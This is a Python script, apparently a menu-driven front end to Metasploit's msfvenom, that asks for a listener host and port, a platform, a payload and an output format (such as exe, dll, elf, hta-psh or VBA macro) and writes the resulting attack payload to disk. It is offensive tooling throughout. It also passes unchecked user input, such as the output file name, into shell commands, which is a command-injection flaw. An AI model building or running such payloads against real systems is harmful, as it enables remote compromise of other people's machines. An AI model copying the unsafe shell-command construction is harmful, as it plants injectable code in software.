# Quick and easy payload generator


import subprocess
import os
import time


print(r"""
  ____             _                 _  ____
 |  _ \ __ _ _   _| | ___   __ _  __| |/ ___| ___ _ __
 | |_) / _` | | | | |/ _ \ / _` |/ _` | |  _ / _ \ '_ \
 |  __/ (_| | |_| | | (_) | (_| | (_| | |_| |  __/ | | |
 |_|   \__,_|\__, |_|\___/ \__,_|\__,_|\____|\___|_| |_|
             |___/

 Quick and easy payload generator

""")

time.sleep(2)

msfvenom = subprocess.getstatusoutput("which msfvenom")

if msfvenom[0] != 0:
    print("[!] Msfvenom not found\n")
    exit()
elif msfvenom[0] == 0:
    msfvenom_path = msfvenom[1]
    print("[+] Msfvenom found: " + msfvenom_path + "\n")

lhost = input("[>] Listen host: ")

if lhost.isspace():
    print("[!] Missing listen host\n")
    exit()

try:
    lport = int(input("[>] Listen port: "))
except:
    print("[!] invalid input\n")
    exit()

platforms = ["aix", "android", "apple_ios", "arista", "brocade",
             "bsd", "bsdi", "cisco", "firefox", "freebsd",
             "hardware", "hpux", "irix", "java", "javascript",
             "juniper", "linux", "mainframe", "mikrotik", "multi",
             "netbsd", "netware", "nodejs", "openbsd", "osx",
             "php", "python", "r", "ruby", "solaris",
             "unifi", "unix", "windows"]

print("\n[*] Select platform")
print("""
    Name
    ----
    aix
    android
    apple_ios
    arista
    brocade
    bsd
    bsdi
    cisco
    firefox
    freebsd
    hardware
    hpux
    irix
    java
    javascript
    juniper
    linux
    mainframe
    mikrotik
    multi
    netbsd
    netware
    nodejs
    openbsd
    osx
    php
    python
    r
    ruby
    solaris
    unifi
    unix
    windows
""")

platform = input("[>] Platform: ")

if platform.isspace():
    print("[!] Missing platform\n")
    exit()

if platform not in platforms:
    print("[!] Invalid platform\n")
    exit()

print("\n[*] Loading payloads. please wait...")

payloads = subprocess.getoutput("msfvenom -l payloads | grep ' " + platform + "/'")

if payloads == "":
    print("[!] No payloads found for this platform\n")
    exit()

print("[*] Select payload")
print("""
    Name                                                Description
    ----                                                -----------
""" + payloads + "\n")

payload = input("[>] Payload: ")

if payload not in payloads:
    print("[!] Invalid payload\n")
    exit()

print("\n[*] Select output format")

output_formats = """
Executable Formats                  Transform Formats
==================                  =================

    Name                                Name
    ----                                ----
    asp                                 base32
    aspx                                base64
    aspx-exe                            bash
    axis2                               c
    dll                                 csharp
    elf                                 dw
    elf-so                              dword
    exe                                 hex
    exe-only                            java
    exe-service                         js_be
    exe-small                           js_le
    hta-psh                             num
    jar                                 perl
    jsp                                 pl
    loop-vbs                            powershell
    macho                               ps1
    msi                                 py
    msi-nouac                           python
    osx-app                             raw
    psh                                 rb
    psh-cmd                             ruby
    psh-net                             sh
    psh-reflection                      vbapplication
    python-reflection                   vbscript
    vba
    vba-exe
    vba-psh
    vbs
    war
"""

print(output_formats)

output_format = input("[>] Output format: ")

if output_format not in output_formats:
    print("[!] Invalid output format\n")
    exit()

output_filename = input("[>] Output file name: ")

if output_filename.isspace():
    print("[!] Missing output file name\n")
    exit()

time.sleep(1)

print("\n[*] Listen host: " + lhost)
print("[*] Listen port: " + str(lport))
print("[*] Platform: " + platform)
print("[*] Payload: " + payload)
print("[*] Output format: " + output_format)
print("[*] Output file name: " + output_filename + "\n")

time.sleep(1)

print("[*] Generating payload...")

try:
    os.mkdir("payloads")
except:
    pass

os.chdir("payloads")

make_payload = subprocess.getstatusoutput(msfvenom_path + " -p " + payload + " LHOST=" + lhost + " LPORT=" + str(lport) + " -f " + output_format + " -o " + output_filename)
msfvenom_result_code = make_payload[0]
msfvenom_output = make_payload[1]

print()

if msfvenom_result_code == 0:
    print("[+] Payload generated\n")

    payload_size = os.stat(output_filename).st_size
    print("[*] Payload size: " + str(payload_size) + " bytes")
    print("[*] Saved as " + os.getcwd() + "/" + output_filename + "\n")
elif msfvenom_result_code != 0:
    error_msg = msfvenom_output.split("\n")[0]

    print("[!] " + error_msg)
    print("[!] Generating payload is failed\n")
    exit()
